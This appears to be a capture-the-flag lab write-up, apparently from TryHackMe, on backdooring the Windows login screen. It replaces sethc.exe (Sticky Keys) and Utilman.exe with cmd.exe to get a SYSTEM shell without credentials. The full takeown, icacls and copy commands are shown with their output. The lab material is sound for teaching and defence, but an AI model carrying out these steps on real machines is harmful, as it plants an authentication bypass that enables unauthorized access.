# Backdooring the Login Screen for RDP Access

If we have physical access to the machine (or RDP in our case), we can backdoor the login screen to access a terminal without valid credentials. This can be achieved by abusing accessibility features. Below, we explore two methods: **Sticky Keys** and **Utilman**.

---

## Sticky Keys

Sticky Keys allow users to press key combinations sequentially instead of simultaneously (e.g., pressing `CTRL`, `ALT`, and `DEL` one at a time). By default, pressing `SHIFT` five times activates Sticky Keys. We can exploit this feature to establish persistence.

### Steps to Backdoor Sticky Keys

1. **Trigger Sticky Keys Shortcut**  
    Press `SHIFT` five times. Normally, this executes the binary located at `C:\Windows\System32\sethc.exe`.

2. **Replace `sethc.exe` with `cmd.exe`**  
    Replace the Sticky Keys binary with a copy of `cmd.exe` to spawn a terminal from the login screen.

    ```cmd
    C:\> takeown /f c:\Windows\System32\sethc.exe
    SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

    C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
    processed file: C:\Windows\System32\sethc.exe
    Successfully processed 1 files; Failed processing 0 files

    C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
    Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
              1 file(s) copied.
    ```

3. **Lock the Session**  
    Lock the session from the Start menu.

4. **Trigger the Backdoor**  
    Press `SHIFT` five times on the login screen to open a terminal with SYSTEM privileges.

### THM Flag
From the terminal, execute the following to retrieve the flag:
```cmd
C:\> C:\flags\flag14.exe
```

---

## Utilman

Utilman is a built-in Windows application that provides Ease of Access options during the lock screen. Clicking the "Ease of Access" button executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. We can replace this binary with `cmd.exe` to bypass the login screen.

### Steps to Backdoor Utilman

1. **Replace `Utilman.exe` with `cmd.exe`**  
    Follow a similar process as with Sticky Keys:

    ```cmd
    C:\> takeown /f c:\Windows\System32\utilman.exe
    SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

    C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
    processed file: C:\Windows\System32\utilman.exe
    Successfully processed 1 files; Failed processing 0 files

    C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
    Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
              1 file(s) copied.
    ```

2. **Lock the Session**  
    Lock the session from the Start menu.

3. **Trigger the Backdoor**  
    Click the "Ease of Access" button on the login screen to open a terminal with SYSTEM privileges.

### THM Flag
From the terminal, execute the following to retrieve the flag:
```cmd
C:\> C:\flags\flag15.exe
```

---

By leveraging these methods, you can establish persistence and gain SYSTEM-level access to a Windows machine.